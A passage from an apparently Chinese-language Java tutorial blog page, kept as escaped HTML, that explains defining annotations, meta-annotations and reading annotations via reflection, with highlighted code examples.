&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Hello&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;morning&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>只不过JVM直接编写了这个中间的类，不需要源码，可以直接生成字节码&lt;/p>
&lt;h2 id="注解">注解&lt;/h2>
&lt;p>注解Annotation，是放在Java源码的类、方法、字段、参数前的一种特殊注释&lt;/p>
&lt;h3 id="使用定义注解">使用&amp;amp;定义注解&lt;/h3>
&lt;p>注解可分为三类&lt;/p>
&lt;ul>
&lt;li>1 编译器使用的注解：这类注解不会被编译进入&lt;code>.class&lt;/code>文件，它们在编译后就被编译器扔掉了&lt;/li>
&lt;/ul>
&lt;p>&lt;code>@Override&lt;/code>：让编译器检查该方法是否正确地实现了覆写&lt;/p>
&lt;p>&lt;code>@SuppressWarnings&lt;/code>：告诉编译器忽略此处代码产生的警告&lt;/p>
&lt;ul>
&lt;li>2 由工具处理&lt;code>.class&lt;/code>文件使用的注解：有些工具会在加载class的时候，对class做动态修改，实现一些特殊的功能；这类注解会被编译进入&lt;code>.class&lt;/code>文件，但加载结束后并不会存在于内存中&lt;/li>
&lt;li>3 程序运行期可读取的注解：加载后一直存在于JVM中，这也是最常用的注解&lt;/li>
&lt;/ul>
&lt;p>&lt;code>@PostConstruct&lt;/code>：配置了它的方法会在调用构造方法后自动被调用，这是Java代码读取该注解实现的功能，JVM并不会识别该注解&lt;/p>
&lt;ul>
&lt;li>定义一个注解时，还可以定义配置参数，配置参数可以包括：基本类型，String，枚举类，基本类型、String、Class以及枚举的数组；可以设置缺省值，如果只写注解，相当于全部使用默认值&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Hello&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Check&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">min&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">max&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">100&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">55&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Check&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">99&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Check&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">99&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#75715e">// @Check(value=99)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Check&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">y&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>@Check&lt;/code>就是一个注解&lt;/p>
&lt;ul>
&lt;li>有一些注解可以修饰其他注解，这些注解就称为元注解Meta annotation&lt;/li>
&lt;/ul>
&lt;p>&lt;code>@Target&lt;/code>：使用&lt;code>@Target&lt;/code>可以定义&lt;code>Annotation&lt;/code>能够被应用于源码的哪些位置&lt;/p>
&lt;pre tabindex="0">&lt;code>类或接口：ElementType.TYPE
字段：ElementType.FIELD
方法：ElementType.METHOD
构造方法：ElementType.CONSTRUCTOR
方法参数：ElementType.PARAMETER
&lt;/code>&lt;/pre>&lt;p>&lt;code>@Retention&lt;/code>：定义了&lt;code>Annotation&lt;/code>的生命周期，通常我们自定义的&lt;code>Annotation&lt;/code>都是&lt;code>RUNTIME&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>仅编译期：RetentionPolicy.SOURCE 编译器被丢掉 一般不用(编译器使用)
仅class文件：RetentionPolicy.CLASS 仅保存在class文件中 不会被加载入JVM(底层工具库使用 涉及class的加载)
运行期：RetentionPolicy.RUNTIME 会被加载进JVM 并在运行期被程序读取(常用)
&lt;/code>&lt;/pre>&lt;p>&lt;code>@Repeatable&lt;/code>：定义&lt;code>Annotation&lt;/code>是否可重复&lt;/p>
&lt;p>&lt;code>@Inherited&lt;/code>：定义子类是否可继承父类定义的&lt;code>Annotatio&lt;/code>，仅针对&lt;code>@Target(ElementType.TYPE)&lt;/code>类型的&lt;code>annotation&lt;/code>有效，并且仅针对&lt;code>class&lt;/code>的继承，对&lt;code>interface&lt;/code>的继承无效&lt;/p>
&lt;ul>
&lt;li>使用&lt;code>@interface&lt;/code>语法来定义注解，用元注释来配置注释，其中&lt;code>@Target&lt;/code>和&lt;code>@Retention&lt;/code>(一般设为RUNTIME)必须设置&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Target&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ElementType&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">TYPE&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Retention&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">RetentionPolicy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">RUNTIME&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">@interface&lt;/span> &lt;span style="color:#111">Report&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">default&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">level&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">default&lt;/span> &lt;span style="color:#d88200">&amp;#34;info&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">value&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">default&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="处理注解">处理注解&lt;/h3>
&lt;p>注解本身对代码逻辑没有任何影响，如何使用注解完全由工具决定&lt;/p>
&lt;p>注解定义后也是一种&lt;code>class&lt;/code>，所有的注解都继承自&lt;code>java.lang.annotation.Annotation&lt;/code>，所以读取注解需要用到反射&lt;/p>
&lt;p>判断某个注解是否存在于&lt;code>Class&lt;/code>、&lt;code>Field&lt;/code>、&lt;code>Method&lt;/code>或&lt;code>Constructor&lt;/code>：&lt;/p>
&lt;ul>
&lt;li>&lt;code>Class.isAnnotationPresent(Class)&lt;/code>&lt;/li>
&lt;li>&lt;code>Field.isAnnotationPresent(Class)&lt;/code>&lt;/li>
&lt;li>&lt;code>Method.isAnnotationPresent(Class)&lt;/code>&lt;/li>
&lt;li>&lt;code>Constructor.isAnnotationPresent(Class)&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 判断@Report是否存在于Person类:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAnnotationPresent&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>反射API读取Annotation：&lt;/p>
&lt;ul>
&lt;li>&lt;code>Class.getAnnotation(Class)&lt;/code>&lt;/li>
&lt;li>&lt;code>Field.getAnnotation(Class)&lt;/code>&lt;/li>
&lt;li>&lt;code>Method.getAnnotation(Class)&lt;/code>&lt;/li>
&lt;li>&lt;code>Constructor.getAnnotation(Class)&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 获取Person定义的@Report注解:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Report&lt;/span> &lt;span style="color:#111">report&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getAnnotation&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">type&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">type&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">level&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">level&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>使用反射API读取&lt;code>Annotation&lt;/code>有两种方法。方法一是先判断&lt;code>Annotation&lt;/code>是否存在，如果存在，就直接读取：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAnnotationPresent&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Report&lt;/span> &lt;span style="color:#111">report&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getAnnotation&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>第二种方法是直接读取&lt;code>Annotation&lt;/code>，如果&lt;code>Annotation&lt;/code>不存在，将返回&lt;code>null&lt;/code>：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Report&lt;/span> &lt;span style="color:#111">report&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getAnnotation&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Report&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">report&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>读取方法、字段和构造方法的&lt;code>Annotation&lt;/code>和Class类似。但要读取方法参数的&lt;code>Annotation&lt;/code>就比较麻烦一点，因为方法参数本身可以看成一个数组，而每个参数又可以定义多个注解，所以，一次获取方法参数的所有注解就必须用一个二维数组来表示。例如，对于以下方法定义的注解：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#75af00">@NotNull&lt;/span> &lt;span style="color:#75af00">@Range&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">max&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">5&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#75af00">@NotNull&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">prefix&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>要读取方法参数的注解，我们先用反射获取&lt;code>Method&lt;/code>实例，然后读取方法参数的所有注解：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 获取Method实例:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 获取所有参数的Annotation:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Annotation&lt;/span>&lt;span style="color:#f92672">[][]&lt;/span> &lt;span style="color:#111">annos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getParameterAnnotations&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 第一个参数（索引为0）的所有Annotation:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Annotation&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">annosOfName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">annos&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Annotation&lt;/span> &lt;span style="color:#111">anno&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">annosOfName&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">anno&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Range&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// @Range注解
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Range&lt;/span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Range&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">anno&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">anno&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">NotNull&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// @NotNull注解
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">NotNull&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">NotNull&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">anno&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>定义了注解，本身对程序逻辑没有任何影响，必须自己编写代码来使用注解&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Retention&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">RetentionPolicy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">RUNTIME&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Target&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ElementType&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">FIELD&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">@interface&lt;/span> &lt;span style="color:#111">Range&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">min&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">default&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">max&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">default&lt;/span> &lt;span style="color:#111">255&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">check&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">person&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IllegalArgumentException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ReflectiveOperationException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 遍历所有Field:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getFields&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 获取Field定义的@Range:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Range&lt;/span> &lt;span style="color:#111">range&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getAnnotation&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Range&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 如果@Range存在:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">range&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 获取Field的值:
